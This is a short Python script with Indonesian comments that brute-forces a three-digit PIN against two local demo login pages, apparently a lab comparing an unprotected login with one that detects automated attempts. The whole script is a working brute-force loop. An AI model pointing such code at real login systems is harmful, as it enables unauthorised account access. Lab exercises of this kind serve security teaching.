import requests
import time

url_vulnerable = "http://localhost/brute_sim/vulnerable_login.php"
url_secure = "http://localhost/brute_sim/secure_login.php"

def jalankan_brute(url):
    print(f"[*] Menyerang Target: {url}")
    start_time = time.time()
    
    for angka in range(1000):
        # Format angka jadi 3 digit (0 -> 000, 1 -> 001)
        pin = f"{angka:03}"
        
        try:
            response = requests.post(url, data={'pin': pin})
            
            # Cek respon dari server
            if "SUCCESS" in response.text:
                end_time = time.time()
                print(f"[+] BERHASIL! PIN ditemukan: {pin}")
                print(f"[*] Waktu: {round(end_time - start_time, 2)} detik.")
                return
            
            elif "BERBAHAYA" in response.text:
                print(f"[!] GAGAL: Robot terdeteksi oleh sistem keamanan!")
                return
                
            # Opsional: print progress setiap 100 kali
            if angka % 100 == 0:
                print(f"[-] Mengetes... {pin}")

        except Exception as e:
            print(f"[X] Error: {e}")
            break

if __name__ == "__main__":
    # COBA 1: Serang yang lemah
    jalankan_brute(url_vulnerable)
    print("-" * 30)
    # COBA 2: Serang yang aman
    jalankan_brute(url_secure)